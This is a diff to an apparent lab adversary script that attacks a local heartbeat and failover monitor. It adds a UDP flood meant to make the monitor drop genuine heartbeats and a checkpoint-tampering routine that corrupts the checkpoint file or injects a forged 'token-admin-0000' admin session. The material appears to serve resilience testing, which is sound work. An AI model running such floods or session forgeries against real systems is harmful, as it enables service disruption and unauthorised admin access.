@@ -4,11 +4,13 @@ import socket
 import random
 import hmac
 import sys
+import json
 
 # Hardcoded victim host and port
 MONITOR_HOST = "127.0.0.1"
 MONITOR_PORT = 9999
 FAILOVER_PORT = 9998
+CHECKPOINT_FILE = "checkpoint.json"
 
 
 def log(msg: str) -> None:
@@ -78,6 +80,40 @@ def induced_failover():
     sock.close()
 
 
+def drop_heartbeats():
+    log("Starting Heartbeat (UDP Flood) attack...")
+    log("Flooding Monitor to force it to drop real heartbeats...")
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # Running flood for longer than 15 secs
+    end_time = time.time() + 16
+    while time.time() < end_time:
+        sock.sendto(b"FLOOD_DATA", (MONITOR_HOST, MONITOR_PORT))
+
+    sock.close()
+    log("Attack complete. Monitor overflowed and real heartbeats were dropped.")
+
+# Attack scenario 2: Tampered Checkpoint/Desync
+def tamper_checkpoint(mode: str) -> None:
+    if mode == "corrupt":
+        # Overwrite the checkpoint with invalid JSON
+        with open(CHECKPOINT_FILE, "w") as f:
+            f.write("{corrupted")
+        log(f"Corrupted {CHECKPOINT_FILE}")
+    else:
+        # Inject a forged admin session into the checkpoint
+        sessions = {}
+        try:
+            with open(CHECKPOINT_FILE, "r") as f:
+                sessions = json.load(f)
+        except Exception:
+            log(f"Could not read {CHECKPOINT_FILE}, creating a new one")
+        sessions["token-admin-0000"] = "admin"
+        with open(CHECKPOINT_FILE, "w") as f:
+            json.dump(sessions, f)
+        log("Injected forged session token-admin-0000 for user admin")
+
+
 if __name__ == "__main__":
     if len(sys.argv) == 2:
         argument = sys.argv[1].lower()
@@ -85,9 +121,13 @@ if __name__ == "__main__":
             heartbeat_spoofing()
         elif argument == "replay":
             replay_attack()
-        elif argument == "induced_failover":
+        elif argument in ("induced_failover", "failover"):
             induced_failover()
+        elif argument == "drop":
+            drop_heartbeats()
+        elif argument == "tamper":
+            tamper_checkpoint("inject")
         else:
-            log("Usage: python adversary.py [heartbeat|replay|failover]")
+            log("Usage: python adversary.py [heartbeat|replay|failover|drop|tamper]")
     else:
-        log("Usage: python adversary.py [heartbeat|replay|failover]")
+        log("Usage: python adversary.py [heartbeat|replay|failover|drop|tamper]")
